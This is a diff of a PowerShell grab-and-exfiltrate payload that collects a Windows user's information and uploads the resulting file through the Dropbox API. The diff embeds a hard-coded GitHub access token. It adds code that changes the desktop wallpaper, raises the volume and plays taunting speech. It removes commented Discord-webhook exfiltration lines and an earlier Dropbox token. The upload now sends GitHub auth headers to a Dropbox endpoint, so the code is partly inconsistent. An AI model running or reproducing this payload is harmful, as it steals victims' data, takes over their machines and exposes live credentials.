@@ -27,13 +27,19 @@
 	All of the gather information is formatted neatly and output to a file 
 	That file is then exfiltrated to cloud storage via DropBox
 
-.Link
-	https://developers.dropbox.com/oauth-guide		# Guide for setting up your DropBox for uploads
 #>
 
 ############################################################################################################################################################
+# Variables
+$token = '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'
+$owner = 'RichardHallade'
+$repo = 'crl'
+$path = 'awareness/results/$FileName'
+$url = "https://raw.githubusercontent.com/$owner/$repo/master/$path"
 
-$DropBoxAccessToken = "sl.BMVhQRHnukEm7247GGQOB-T635z4_xRbxHfhcOmZiCTDdCknALOurAIXGN4MLxLwoHARtn1xNT9f_cNV4y8R-UV9BYc-xi41iK8ezS799TnRBEmqGWhmHRqZn9q2fG92TPV4DoEkRP7a"
+$headers = @{
+    'Authorization' = "Bearer $token"
+}
 
 ############################################################################################################################################################
 
@@ -42,7 +48,7 @@ $DropBoxAccessToken = "sl.BMVhQRHnukEm7247GGQOB-T635z4_xRbxHfhcOmZiCTDdCknALOurA
     try {
 
     $fullName = Net User $env:username | Select-String -Pattern "Nom complet";$fullName = ("$fullName").TrimStart("Nom complet")
-    $nameuser = Net User $env:username | Select-String -Pattern "Nom d’utilisateur";$fullName = ("$fullName").TrimStart("Nom d’utilisateur")
+    $nameuser = Net User $env:username | Select-String -Pattern "Nom d'utilisateur";$fullName = ("$fullName").TrimStart("Nom d’utilisateur")
 
     }
  
@@ -60,6 +66,51 @@ $DropBoxAccessToken = "sl.BMVhQRHnukEm7247GGQOB-T635z4_xRbxHfhcOmZiCTDdCknALOurA
 }
 
 $FN = Get-fullName
+
+#------------------------------------------------------------------------------------------------------------------------------------
+
+#Changes Background  
+#URL For the Image of your choice (Wanna Cry Ransomware Background)
+$wallpaperurl = "https://c4.wallpaperflare.com/wallpaper/553/61/171/5k-black-hd-mockup-wallpaper-preview.jpg"
+
+
+Invoke-WebRequest $wallpaperurl -OutFile C:\temp\test.jpg
+
+$setwallpapersrc = @"
+using System.Runtime.InteropServices;
+
+public class Wallpaper
+{
+  public const int SetDesktopWallpaper = 20;
+  public const int UpdateIniFile = 0x01;
+  public const int SendWinIniChange = 0x02;
+  [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+  private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
+  public static void SetWallpaper(string path)
+  {
+    SystemParametersInfo(SetDesktopWallpaper, 0, path, UpdateIniFile | SendWinIniChange);
+  }
+}
+"@
+Add-Type -TypeDefinition $setwallpapersrc
+
+[Wallpaper]::SetWallpaper("C:\temp\test.jpg")
+
+#------------------------------------------------------------------------------------------------------------------------------------
+
+# Sets Volume to max level
+
+$k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}
+
+# Sets up speech module 
+
+$s=New-Object -ComObject SAPI.SpVoice
+$s.Rate = -2
+#$s.Speak("We found you $fullName")
+$s.Speak("Wake up Neo")
+$s.Speak("The Matrix has you")
+$s.Speak("Follow the white rabbit")
+$s.Speak("Knock, knock, Neo.")
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
@@ -372,18 +423,6 @@ vault -ErrorAction SilentlyContinue -Force
 
 $TargetFilePath="/$FileName"
 $SourceFilePath="$env:TMP\$FileName"
-$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-$authorization = "Bearer " + $DropBoxAccessToken
-$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
-$headers.Add("Authorization", $authorization)
-$headers.Add("Dropbox-API-Arg", $arg)
-$headers.Add("Content-Type", 'application/octet-stream')
-#Copy-Item "$env:TMP\$FileName" -Destination "C:\temp\test.txt"
-#STRING $url="YOUR DISCORD WEBHOOK";-Uri $url  -Method Post -Body ($Body | ConvertTo-Json);curl.exe -F $SourceFilePath $url
-# Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);curl.exe -F "file1=@stats.txt" $url
-#$url="https://discord.com/api/webhooks/972384815649284177/XwcR31_sCxPkONEzt1oJyMnnks5NsmcPjgp90FOoj59sUOd-KR9Fdz4jESMl9jrH_U3F"
-#Invoke-RestMethod -Uri $url -Method Post -Body "$env:TMP\$FileName" -ContentType "application/json"
-#Invoke-RestMethod -Uri https://discord.com/api/webhooks/972384815649284177/XwcR31_sCxPkONEzt1oJyMnnks5NsmcPjgp90FOoj59sUOd-KR9Fdz4jESMl9jrH_U3F -Method Post -InFile $SourceFilePath -Headers $headers
 Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile "$env:TMP\$FileName" -Headers $headers
 
 ############################################################################################################################################################
@@ -412,8 +451,3 @@ Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
 		
 ############################################################################################################################################################
-
-# Popup message to signal the payload is done
-
-$done = New-Object -ComObject Wscript.Shell;$done.Popup("script is done",1)
-	
